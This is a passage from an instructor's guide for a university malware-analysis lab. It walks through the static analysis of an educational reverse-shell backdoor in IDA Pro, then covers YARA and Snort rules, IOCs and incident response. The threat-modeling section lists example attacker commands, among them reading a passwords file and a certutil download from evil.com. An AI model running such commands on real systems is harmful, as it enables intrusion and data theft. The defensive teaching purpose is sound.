"Let's find EVERYWHERE that _popen (command execution) is called."

1. Press Shift+F3 to open Functions window
2. Locate _popen in the list (it's an import)
3. Double-click to jump to _popen
4. Press X (cross-references shortcut)

A window appears showing all references!

Example output:
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ DATA XREFS to _popen                           â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ establish_connection+14F   call _popen         â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

[INSTRUCTOR SAY]:
"This shows that _popen is called from exactly ONE place: inside the
establish_connection function at offset +14F (0x14F bytes from function start)."

"If there were multiple calls, we'd see multiple entries. The fact that
there's only one makes our analysis easier!"

5. Double-click the reference to jump to the exact code location

STEP 7.3: ANALYZE THE CONTEXT
------------------------------
[INSTRUCTOR: Show the instructions around the _popen call]

"Now let's look at what happens RIGHT BEFORE and AFTER the _popen call."

Before _popen:
   lea     eax, [ebp+recvbuf]    ; Get the buffer from recv()
   push    offset "r"            ; Open for reading
   push    eax                   ; Pass the command

   call    _popen                ; â† EXECUTE!

After _popen:
   mov     [ebp+fp], eax         ; Save the file pointer
   [... code to read output ...]

[INSTRUCTOR SAY]:
"See? The buffer that came from recv() is passed DIRECTLY to _popen()!
This confirms our earlier finding - no validation whatsoever!"

STEP 7.4: TRACE BACKWARD FROM DANGEROUS FUNCTION
-------------------------------------------------
[INSTRUCTOR: Show backward tracing]

"Now let's trace BACKWARD. Where does 'recvbuf' get its data?"

1. Click on 'recvbuf' variable in the code
2. Press X for cross-references
3. Look for where it's written (not just read)

You'll find:
   call    recv
   mov     [ebp+recvbuf], ...   ; Write received data

"Perfect! This confirms the data flow: Network â†’ recv() â†’ recvbuf â†’ _popen()"

STEP 7.5: FIND WHO CALLS THE MAIN MALICIOUS FUNCTION
-----------------------------------------------------
[INSTRUCTOR: Demonstrate]

"Now let's see WHO calls establish_connection."

1. Navigate to establish_connection function
2. Press X while at the function start
3. Look at "Code Xrefs TO establish_connection"

You should see:
   main+XXX   call establish_connection

[INSTRUCTOR SAY]:
"So the main() function calls establish_connection. Let's see WHEN."

4. Double-click the reference to jump to main()

You'll see something like:
   call    check_system_updates      ; Decoy function (innocent)
   call    decode_string              ; Decode the hidden IP
   call    establish_connection       ; MALICIOUS FUNCTION!

[INSTRUCTOR SAY]:
"Interesting! The malware first calls 'check_system_updates' - probably to
look innocent. Then it decodes the obfuscated IP address, then establishes
the backdoor connection."

STEP 7.6: ANALYZE THE OBFUSCATION FUNCTION
-------------------------------------------
[INSTRUCTOR: Quick detour to show obfuscation]

"Let's quickly look at decode_string since it's called before establishing
the connection."

1. Navigate to decode_string function
2. Press Spacebar for Graph View

You'll see a simple XOR loop:
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ mov     ecx, [ebp+len]      â”‚  ; Loop counter = length
â”‚ xor     edx, edx            â”‚  ; i = 0
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
             â”‚
             â–¼
    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚ mov     al, [ebp+encoded+edx]  â”‚  ; Get encoded[i]
    â”‚ xor     al, [ebp+key]          â”‚  ; XOR with key â† Decode!
    â”‚ mov     [ebp+encoded+edx], al  â”‚  ; Store decoded byte
    â”‚ inc     edx                     â”‚  ; i++
    â”‚ cmp     edx, ecx                â”‚  ; i < len?
    â”‚ jl      loop_start              â”‚  ; Continue if yes
    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

[INSTRUCTOR SAY]:
"This is a simple XOR cipher - each byte of the encoded string is XORed
with a key to decode it. This is how the malware hides the target IP
address from simple string searches!"

"If you just scanned the binary for IP addresses, you might miss this
because it's encoded. But we found it by analyzing the code!"

STEP 7.7: DOCUMENT THE COMPLETE EXECUTION FLOW
-----------------------------------------------
[INSTRUCTOR: Draw on whiteboard]

COMPLETE MALWARE EXECUTION FLOW:
---------------------------------
START (main function)
  â”‚
  â”œâ”€â†’ check_system_updates()  [Decoy - looks innocent]
  â”‚
  â”œâ”€â†’ decode_string()         [Deobfuscate target IP]
  â”‚    â””â”€â†’ XOR loop
  â”‚
  â””â”€â†’ establish_connection()  [MAIN MALICIOUS FUNCTION]
       â”‚
       â”œâ”€â†’ WSAStartup()       [Initialize networking]
       â”œâ”€â†’ socket()           [Create socket]
       â”œâ”€â†’ connect()          [Connect to attacker - OUTBOUND!]
       â”‚
       â””â”€â†’ COMMAND LOOP:
            â”œâ”€â†’ recv()        [Wait for command]
            â”œâ”€â†’ _popen()      [Execute command - NO VALIDATION!]
            â”œâ”€â†’ fgets()       [Read output]
            â”œâ”€â†’ send()        [Send results back]
            â””â”€â†’ [Loop back]

END

STEP 7.8: STUDENT EXERCISE
---------------------------
[Give students 5 minutes]

"Practice using cross-references:
1. Navigate to 'send' function (in imports)
2. Press X to see cross-references
3. How many times is 'send' called?
4. Where is it called from?
5. What data is being sent? (look at the parameters)"

[This reinforces the cross-reference technique]

================================================================================
SECTION 8: STEP 6 - IDENTIFYING MALICIOUS BEHAVIOR (SUMMARY)
================================================================================

STEP 8.1: COMPILE ALL EVIDENCE
-------------------------------
[INSTRUCTOR: Review everything on whiteboard]

"Let's summarize everything we've found:"

EVIDENCE OF MALICIOUS BEHAVIOR:
================================

1. IMPORTS ANALYSIS:
   âœ— Networking functions: WSAStartup, socket, connect, send, recv
   âœ— Command execution: _popen
   âœ— Combination = backdoor capability

2. STRING ANALYSIS:
   âœ— "Connecting to %s:%d" - network connection
   âœ— "Received command: %s" - command reception
   âœ— IP address found: 127.0.0.1
   âœ— Command keyword: "exit"

3. FUNCTION ANALYSIS:
   âœ— establish_connection() - obvious malicious intent
   âœ— decode_string() - obfuscation to hide evidence
   âœ— install_persistence() - attempts to remain on system

4. CONTROL FLOW ANALYSIS:
   âœ— Outbound connection (reverse shell pattern)
   âœ— Infinite command loop
   âœ— No input validation
   âœ— Direct path: network â†’ execution

5. DATA FLOW ANALYSIS:
   âœ— recv() â†’ buffer â†’ _popen() with NO sanitization
   âœ— Command output â†’ buffer â†’ send() back to attacker

FINAL ASSESSMENT: CONFIRMED BACKDOOR
=====================================
Type: Reverse Shell
Capabilities:
  â€¢ Remote command execution
  â€¢ Full system control
  â€¢ Persistent connection
  â€¢ Command output exfiltration

Severity: CRITICAL

STEP 8.2: MALWARE CLASSIFICATION
---------------------------------
[INSTRUCTOR: Explain classification]

"Based on our analysis, we can classify this malware:"

Primary Category: Backdoor / Remote Access Trojan (RAT)

Characteristics:
âœ“ Provides unauthorized remote access
âœ“ Allows command execution
âœ“ Communicates with external server
âœ“ Can receive and execute arbitrary commands

Secondary Traits:
âœ“ Uses obfuscation (XOR encoding)
âœ“ Has persistence mechanism
âœ“ Reverse shell (outbound connection)

NOT:
âœ— Ransomware (doesn't encrypt files)
âœ— Worm (doesn't self-replicate)
âœ— Virus (doesn't infect other files)
âœ— Keylogger (doesn't log keystrokes - at least not in this code)

STEP 8.3: THREAT MODELING
--------------------------
[INSTRUCTOR: Discuss attacker perspective]

"Let's think like an attacker. Why would they use this backdoor?"

ATTACKER OBJECTIVES:
1. Maintain Access: Stay on the compromised system
2. Command Execution: Run any command as the victim
3. Data Exfiltration: Copy sensitive files
4. Lateral Movement: Use this system to attack others
5. Persistence: Survive reboots

HOW THEY WOULD USE IT:
1. Infect victim's machine (phishing, exploit, etc.)
2. Backdoor runs and connects to attacker's server (C2)
3. Attacker sees new connection in their listener
4. Attacker types commands, receives outputs
5. Attacker explores system, steals data, installs more malware

Example attack sequence:
1. whoami             â†’ See what user they are
2. ipconfig           â†’ Get network info
3. dir C:\Users       â†’ Find user directories
4. dir C:\Users\John\Documents  â†’ Find documents
5. type passwords.txt â†’ Read sensitive file
6. certutil -urlcache -split -f http://evil.com/tool.exe C:\tool.exe  â†’ Download more malware

STEP 8.4: DEFENSIVE PERSPECTIVE
--------------------------------
[INSTRUCTOR: Discuss defender response]

"Now let's think like defenders. How do we detect and respond?"

DETECTION METHODS:

1. Network-Based Detection:
   âœ“ Monitor for unusual outbound connections
   âœ“ Alert on connections to known bad IPs
   âœ“ Detect anomalous traffic patterns
   âœ“ Use IDS/IPS (Intrusion Detection/Prevention Systems)

2. Host-Based Detection:
   âœ“ Monitor process creation (_popen, cmd.exe launched by unusual processes)
   âœ“ Watch for suspicious network API calls
   âœ“ Detect processes with both network and execution capabilities
   âœ“ Use EDR (Endpoint Detection and Response) tools

3. Signature-Based Detection:
   âœ“ Create YARA rules matching our IOCs
   âœ“ Signature for XOR decoding loop
   âœ“ Signature for command loop pattern
   âœ“ String-based signatures

4. Behavioral Detection:
   âœ“ Alert on process making outbound connection then executing commands
   âœ“ Detect recv() â†’ execution pattern
   âœ“ Monitor for persistence mechanisms

INCIDENT RESPONSE:

If you find this backdoor on a system:

IMMEDIATE (First 15 minutes):
1. Isolate the infected system (disconnect network)
2. Kill the malicious process
3. Block the C2 IP address at firewall
4. Alert security team

SHORT TERM (First hour):
5. Capture memory dump for forensics
6. Preserve evidence (logs, network captures)
7. Scan all other systems for same IOCs
8. Check logs for data exfiltration

REMEDIATION (First 24 hours):
9. Determine infection vector (how it got in)
10. Remove malware and persistence mechanisms
11. Patch vulnerability that allowed infection
12. Change all credentials (assume they're compromised)
13. Restore from clean backup or rebuild system

LONG TERM:
14. Threat hunt for similar infections
15. Improve detection rules
16. User security awareness training
17. Implement defense-in-depth controls

================================================================================
SECTION 9: STEP 7 - CREATING DETECTION SIGNATURES
================================================================================

CONCEPT:
--------
Based on our analysis, we can create signatures that detect this malware and
similar variants. We'll create YARA rules - a pattern-matching language
specifically designed for malware detection.

STEP 9.1: UNDERSTAND YARA RULES
--------------------------------
[INSTRUCTOR: Explain YARA basics]

YARA rules have three main sections:

1. meta: Metadata about the rule (author, description, etc.)
2. strings: Patterns to search for
3. condition: Logic that determines a match

Basic structure:
rule RuleName
{
    meta:
        author = "Your Name"
        description = "What this detects"

    strings:
        $string1 = "text to find"
        $hex1 = { 6A 40 68 00 30 00 00 }

    condition:
        $string1 or $hex1
}

STEP 9.2: CREATE YARA RULE BASED ON STRINGS
--------------------------------------------
[INSTRUCTOR: Write on screen/whiteboard]

rule Educational_Backdoor_Strings
{
    meta:
        author = "MSc Cybersecurity Class"
        description = "Detects the educational backdoor sample"
        date = "2026-01-15"
        severity = "Critical"
        malware_type = "Backdoor/RAT"

    strings:
        // Networking strings
        $net1 = "Initializing Winsock" ascii
        $net2 = "Socket created" ascii
        $net3 = "Connecting to" ascii
        $net4 = "Connected!" ascii

        // Command execution strings
        $cmd1 = "Received command:" ascii
        $cmd2 = "exit" ascii

        // Function names (if debug symbols present)
        $func1 = "establish_connection" ascii
        $func2 = "decode_string" ascii
        $func3 = "install_persistence" ascii

    condition:
        // If we find multiple networking strings AND command strings
        (2 of ($net*)) and (1 of ($cmd*))

        // OR if we find the obvious function names
        or (2 of ($func*))
}

[INSTRUCTOR SAY]:
"This rule looks for combinations of strings we identified. If a file has
multiple networking-related strings AND command execution strings, it's
probably this backdoor or a variant."

STEP 9.3: CREATE YARA RULE BASED ON IMPORTS
--------------------------------------------
[INSTRUCTOR: Write next rule]

rule Educational_Backdoor_Imports
{
    meta:
        description = "Detects backdoor based on dangerous import combination"

    strings:
        // Networking imports
        $imp1 = "WSAStartup" ascii
        $imp2 = "socket" ascii
        $imp3 = "connect" ascii
        $imp4 = "recv" ascii
        $imp5 = "send" ascii

        // Execution imports
        $imp6 = "_popen" ascii
        $imp7 = "system" ascii
        $imp8 = "WinExec" ascii
        $imp9 = "CreateProcess" ascii

    condition:
        // Must have networking stack (WSAStartup + socket + connect)
        ($imp1 and $imp2 and $imp3)

        // AND must have bidirectional communication (send + recv)
        and ($imp4 and $imp5)

        // AND must have command execution capability
        and (any of ($imp6, $imp7, $imp8, $imp9))
}

[INSTRUCTOR SAY]:
"This rule is more generic - it detects ANY program that has:
  1. Network initialization
  2. Outbound connection capability
  3. Bidirectional communication
  4. Command execution

This is the PATTERN of a backdoor, regardless of specific strings!"

STEP 9.4: CREATE YARA RULE BASED ON CODE PATTERNS
--------------------------------------------------
[INSTRUCTOR: Write advanced rule]

rule Educational_Backdoor_Code_Pattern
{
    meta:
        description = "Detects XOR decode loop and command execution pattern"

    strings:
        // XOR decode loop pattern (simplified)
        $xor_loop = {
            8A ?? ??        // mov al, [something]
            34 ??           // xor al, key
            88 ?? ??        // mov [something], al
            4?              // inc register
            E? ??           // loop or conditional jump
        }

        // Call to _popen with parameters
        $popen_call = {
            68 ?? ?? ?? ??  // push offset "r"
            5?              // push register (command string)
            FF 15 ?? ?? ?? ?? // call _popen
        }

        // recv call followed by execution
        $recv_exec = {
            FF 15 ?? ?? ?? ?? // call recv
            85 C0             // test eax, eax
            7? ??             // conditional jump
            [0-20]            // up to 20 bytes between
            FF 15 ?? ?? ?? ?? // call _popen or system
        }

    condition:
        $xor_loop and ($popen_call or $recv_exec)
}

[INSTRUCTOR SAY]:
"This is an advanced rule that looks for actual ASSEMBLY CODE PATTERNS.
The ?? are wildcards - we don't care about the exact values, just the pattern.

This detects:
1. XOR decoding loop (obfuscation)
2. Calls to _popen with parameters
3. recv() immediately followed by execution function

This is much harder for malware authors to evade!"

STEP 9.5: TEST THE YARA RULES
------------------------------
[INSTRUCTOR: Demonstrate testing]

"Let's test our rules against the backdoor sample."

Command:
yara educational_backdoor.yar simple_backdoor.exe

Expected output:
Educational_Backdoor_Strings simple_backdoor.exe
Educational_Backdoor_Imports simple_backdoor.exe
Educational_Backdoor_Code_Pattern simple_backdoor.exe

[INSTRUCTOR SAY]:
"All three rules matched! This means our signatures are working correctly."

"Now let's test against a legitimate program to make sure we don't have
false positives:"

yara educational_backdoor.yar C:\Windows\System32\notepad.exe

Expected output:
[No matches]

"Good! Notepad doesn't trigger our rules."

STEP 9.6: CREATE SNORT NETWORK RULE
------------------------------------
[INSTRUCTOR: Show network-based detection]

"YARA detects malware files. Snort detects malware NETWORK TRAFFIC."

"Based on our analysis, the backdoor communicates over TCP port 4444
(unless changed). Here's a Snort rule:"

alert tcp $HOME_NET any -> $EXTERNAL_NET 4444 (
    msg:"Possible Backdoor Connection - Outbound to Port 4444";
    flow:to_server,established;
    content:"exit";
    classtype:trojan-activity;
    sid:1000001;
    rev:1;
)

alert tcp $EXTERNAL_NET 4444 -> $HOME_NET any (
    msg:"Possible Backdoor Command Received";
    flow:from_server,established;
    content:"whoami";
    classtype:trojan-activity;
    sid:1000002;
    rev:1;
)

[INSTRUCTOR SAY]:
"The first rule alerts when a system makes an outbound connection to port 4444.
The second alerts when specific commands are seen in the traffic.

In a real environment, you'd tune these rules based on your network's normal
behavior."

STEP 9.7: DOCUMENT ALL IOCS
----------------------------
[INSTRUCTOR: Create comprehensive IOC list]

"Finally, let's create a complete IOC (Indicator of Compromise) list that
can be shared with other defenders:"

INDICATORS OF COMPROMISE (IOCs)
================================

FILE INDICATORS:
----------------
File Name: simple_backdoor.exe (or variants)
File Size: [actual size] bytes
MD5:       [calculate: md5sum simple_backdoor.exe]
SHA1:      [calculate: sha1sum simple_backdoor.exe]
SHA256:    [calculate: sha256sum simple_backdoor.exe]

NETWORK INDICATORS:
-------------------
Protocol: TCP
Port: 4444 (default, may vary)
Direction: Outbound (reverse shell)
Target IP: 127.0.0.1 (in this sample, real malware would use attacker IP)

BEHAVIORAL INDICATORS:
----------------------
â€¢ Process creates outbound TCP connection
â€¢ Process uses both network and command execution APIs
â€¢ Process spawns cmd.exe or powershell.exe as child
â€¢ Suspicious command executions from network-connected process

REGISTRY INDICATORS:
--------------------
(If persistence was active):
â€¢ HKCU\Software\Microsoft\Windows\CurrentVersion\Run
â€¢ Suspicious entries pointing to malware executable

STRING INDICATORS:
------------------
â€¢ "Initializing Winsock"
â€¢ "Connecting to %s:%d"
â€¢ "Received command: %s"
â€¢ "establish_connection"
â€¢ "install_persistence"

API CALL PATTERNS:
------------------
Sequence: WSAStartup â†’ socket â†’ connect â†’ [loop: recv â†’ _popen â†’ send]

DETECTION RULES:
----------------
â€¢ YARA: [paste rules created above]
â€¢ Snort: [paste Snort rules]

MITIGATION:
-----------
1. Block outbound connections to port 4444
2. Monitor for suspicious _popen / system calls
3. Implement application whitelisting
4. Deploy EDR solutions
5. Network segmentation

STEP 9.8: STUDENT EXERCISE
---------------------------
[Give students 15 minutes]

"Your final exercise:

1. Choose ONE of the three YARA rules I showed you
2. Modify it to make it MORE specific to our sample
   (add more strings, tighten conditions, etc.)
3. Test your rule against simple_backdoor.exe
4. Document why your changes improve detection

BONUS: Create a NEW rule that detects a different aspect of the backdoor!"

[Walk around and help students]

================================================================================
SECTION 10: CONCLUSION AND Q&A
================================================================================

STEP 10.1: RECAP THE METHODOLOGY
---------------------------------
[INSTRUCTOR: Summary slide or whiteboard]

"Let's recap the complete static analysis methodology we used today:"

STEP-BY-STEP MALWARE ANALYSIS PROCESS:
=======================================

1. IMPORT ANALYSIS (Ctrl+I)
   â†’ Identify suspicious APIs
   â†’ Look for combinations (network + execution)

2. STRING ANALYSIS (Shift+F12)
   â†’ Find IPs, URLs, commands, error messages
   â†’ Cross-reference to code usage

3. FUNCTION ANALYSIS (Shift+F3)
   â†’ Identify suspicious function names
   â†’ Navigate to interesting functions

4. GRAPH VIEW ANALYSIS (Spacebar)
   â†’ Understand control flow visually
   â†’ Identify loops, conditions, patterns

5. CROSS-REFERENCE ANALYSIS (X)
   â†’ Trace data flow
   â†’ Find all uses of dangerous functions

6. BEHAVIORAL SYNTHESIS
   â†’ Combine all evidence
   â†’ Determine malware type and capabilities

7. SIGNATURE CREATION
   â†’ Create YARA rules
   â†’ Create network signatures
   â†’ Document IOCs

STEP 10.2: KEY TAKEAWAYS
-------------------------
[INSTRUCTOR: Emphasize these points]

"What should you remember from today?"

1. COMBINATION IS KEY:
   Networking alone is fine. Execution alone is fine.
   NETWORKING + EXECUTION = BACKDOOR!

2. FOLLOW THE DATA:
   Trace from input (recv) to dangerous function (_popen).
   If there's no validation in between, it's exploitable!

3. GRAPH VIEW IS YOUR FRIEND:
   Complex code becomes clear when visualized.
   Look for patterns: loops, conditions, suspicious sequences.

4. OBFUSCATION IS COMMON:
   Malware hides strings, encrypts configuration, etc.
   But obfuscation code leaves patterns we can detect!

5. STATIC ANALYSIS HAS LIMITS:
   We can see what the code CAN do, not necessarily what it WILL do.
   Dynamic analysis (running in debugger) complements static analysis.

STEP 10.3: BEYOND THIS LAB
---------------------------
[INSTRUCTOR: Set expectations for continued learning]

"This backdoor was simple and educational. Real-world malware is harder:"

REAL-WORLD CHALLENGES:
----------------------
â€¢ Packing/Encryption: Code is compressed or encrypted
â€¢ Anti-debugging: Malware detects and evades analysis
â€¢ Polymorphism: Each sample is slightly different
â€¢ Obfuscation: Much more sophisticated than simple XOR
â€¢ No debug symbols: No helpful function names
â€¢ Large binaries: Thousands of functions to analyze
â€¢ Anti-disassembly: Tricks to confuse IDA Pro

NEXT STEPS IN YOUR LEARNING:
-----------------------------
1. Practice: Analyze more samples (crackmes.one, MalwareBazaar)
2. Learn assembly: Better understanding = better analysis
3. Dynamic analysis: Learn x64dbg, OllyDbg, or WinDbg
4. Scripting: Learn IDA Python for automation
5. Reverse engineering: Take advanced courses

RECOMMENDED RESOURCES:
----------------------
Books:
â€¢ "Practical Malware Analysis" by Sikorski & Honig
â€¢ "The IDA Pro Book" by Eagle
â€¢ "Reversing: Secrets of Reverse Engineering" by Eldad Eilam

Websites:
â€¢ Malware Unicorn (malwareunicorn.org)
â€¢ OpenSecurityTraining (opensecuritytraining.info)
â€¢ MalwareBreakdown Blog

Tools to Learn:
â€¢ Ghidra (NSA's free alternative to IDA Pro)
â€¢ x64dbg (debugger)
â€¢ Process Monitor (runtime monitoring)
â€¢ Wireshark (network analysis)

STEP 10.4: ETHICAL AND LEGAL CONSIDERATIONS
--------------------------------------------
[INSTRUCTOR: Important reminder]

"Before we finish, a critical reminder about ethics and legality:"

YOU MAY:
âœ“ Analyze malware in controlled lab environments
âœ“ Study malware for defensive purposes
âœ“ Create educational samples (like we did)
âœ“ Develop detection signatures
âœ“ Perform authorized penetration testing

YOU MAY NOT:
âœ— Create malware for malicious purposes
âœ— Deploy malware on systems without authorization
âœ— Share malware with unauthorized people
âœ— Use these skills to commit crimes
âœ— Access systems without permission

LEGAL FRAMEWORK:
â€¢ Computer Fraud and Abuse Act (CFAA) in USA
â€¢ Computer Misuse Act in UK
â€¢ Similar laws worldwide

REMEMBER:
"With great power comes great responsibility. You now have the skills to
understand and detect malware. Use them ethically to DEFEND, not to attack!"

STEP 10.5: Q&A SESSION
-----------------------
[INSTRUCTOR: Open floor for questions]

"Now I'll take your questions. Topics might include:"

POSSIBLE QUESTION TOPICS:
â€¢ IDA Pro features we didn't cover
â€¢ Specific parts of the analysis you found confusing
â€¢ How to analyze other malware types
â€¢ Career paths in malware analysis and reverse engineering
â€¢ Tools and techniques for further learning
â€¢ Real-world malware samples you've heard about

[Take questions for 15-20 minutes]

COMMON QUESTIONS AND ANSWERS:
------------------------------

Q: "How long does it take to analyze real malware?"
A: "Anywhere from hours to weeks, depending on complexity. Simple samples
    might take 2-4 hours. Advanced APT malware can take teams weeks or months."

Q: "Is this backdoor dangerous to keep on my system?"
A: "In the isolated lab environment, it's safe because it only targets
    127.0.0.1 (localhost). But NEVER take it out of the lab! Always treat
    malware as dangerous, even educational samples."

Q: "Can I get a job just knowing IDA Pro?"
A: "IDA Pro is one tool of many. You need: assembly language, operating
    system internals, networking, scripting (Python), and experience with
    diverse malware families. But it's a great start!"

Q: "How do I analyze packed malware?"
A: "Packed malware is compressed/encrypted. You first need to UNPACK it,
    either manually (find the unpacking routine) or using automated tools.
    That's an advanced topic for another day!"

Q: "What's the difference between static and dynamic analysis?"
A: "Static: Analyze without running (what we did today).
    Dynamic: Run malware in controlled environment and observe behavior.
    Both are important and complement each other!"

Q: "Are there automated tools?"
A: "Yes! Cuckoo Sandbox, Any.Run, Joe Sandbox automate dynamic analysis.
    But automated tools miss things. Manual analysis finds what machines miss!"

STEP 10.6: FINAL ASSESSMENT
----------------------------
[INSTRUCTOR: Assign homework/lab report]

"Your assessment for this lab:"

DUE DATE: [Specify date]

DELIVERABLES:
1. Completed student handout (all questions answered)
2. Screenshots from IDA Pro showing:
   a. Imports window with annotations
   b. Strings window highlighting IOCs
   c. Graph view of establish_connection with your notes
   d. One cross-reference trace
3. Your YARA rule (tested and working)
4. Written report (2-3 pages) including:
   a. Executive summary (non-technical)
   b. Technical analysis summary
   c. IOC list
   d. Remediation recommendations

GRADING RUBRIC:
â€¢ Import/String Analysis: 20 points
â€¢ Function/Graph Analysis: 30 points
â€¢ Cross-reference Tracing: 15 points
â€¢ YARA Rule: 15 points
â€¢ Written Report Quality: 20 points
TOTAL: 100 points

BONUS OPPORTUNITIES (+10 points each):
â€¢ Create a working Snort rule and test it
â€¢ Analyze the install_persistence function and document how it works
â€¢ Write an IDA Python script to automate part of the analysis

================================================================================
APPENDIX: QUICK REFERENCE CARDS
================================================================================

IDA PRO KEYBOARD SHORTCUTS:
===========================
Ctrl+I      Open Imports window
Shift+F12   Open Strings window
Shift+F3    Open Functions window
Spacebar    Toggle Text View / Graph View
G           Jump to address
X           Cross-references
N           Rename function/variable
;           Add comment
:           Enter comment (different type)
F5          Hex-Rays decompiler (if available)
Tab         Switch between views
Esc         Go back (navigation history)
Ctrl+E      Enter hex value
?           Help

MALWARE ANALYSIS CHECKLIST:
============================
â˜ Imports: Check for suspicious API combinations
â˜ Strings: Search for IPs, URLs, commands
â˜ Functions: Identify suspicious function names
â˜ Entry point: Trace from main/start
â˜ Network code: Analyze socket operations
â˜ Execution code: Analyze system/exec calls
â˜ Loops: Identify command loops
â˜ Obfuscation: Look for decode/decrypt functions
â˜ Persistence: Check for registry/file modifications
â˜ Anti-analysis: Look for anti-debug/anti-vm code
â˜ Documentation: Record all IOCs
â˜ Signatures: Create YARA rules

RED FLAGS FOR BACKDOORS:
========================
ğŸš© connect() + _popen() combination
ğŸš© Outbound connection followed by command loop
ğŸš© No input validation between network and execution
ğŸš© recv() â†’ execute pattern
ğŸš© Persistent network loop
ğŸš© String obfuscation (XOR, base64, etc.)
ğŸš© Function names like "establish_connection"
ğŸš© Registry persistence mechanisms

COMMON WINDOWS API CALLS IN MALWARE:
=====================================
NETWORKING:
WSAStartup, socket, connect, bind, listen, accept, send, recv, WSACleanup

EXECUTION:
system, _popen, WinExec, CreateProcess, ShellExecute, CreateThread

PERSISTENCE:
RegCreateKey, RegSetValue, CopyFile, CreateService, SetWindowsHookEx

FILE OPERATIONS:
CreateFile, ReadFile, WriteFile, DeleteFile, FindFirstFile

PROCESS MANIPULATION:
OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread

ANTI-ANALYSIS:
IsDebuggerPresent, CheckRemoteDebuggerPresent, QueryPerformanceCounter

================================================================================
END OF DEMONSTRATION GUIDE
================================================================================

INSTRUCTOR NOTES:
-----------------
â€¢ This guide is designed for a 2-hour lab session
â€¢ Adjust timing based on your class's pace
â€¢ Encourage questions throughout
â€¢ Have backup examples ready if needed
â€¢ Consider recording the demonstration for students to review later
â€¢ Provide all necessary files on a USB drive or network share

TECHNICAL REQUIREMENTS:
-----------------------
â€¢ IDA Pro installed on all student machines
â€¢ Compiled backdoor samples distributed securely
â€¢ Isolated lab network (no internet access)
â€¢ Virtual machines preferred
â€¢ Wireshark (optional, for network analysis demo)
â€¢ Text editor for YARA rules

SAFETY REMINDERS:
-----------------
â€¢ Verify lab network isolation before class
â€¢ Brief students on handling malware safely
â€¢ Monitor student activities during analysis
â€¢ Collect and securely delete all samples after class
â€¢ Report any incidents to IT security

================================================================================
Document created for educational purposes only.
MSc Cybersecurity Program - Malware Analysis Course
2026
================================================================================
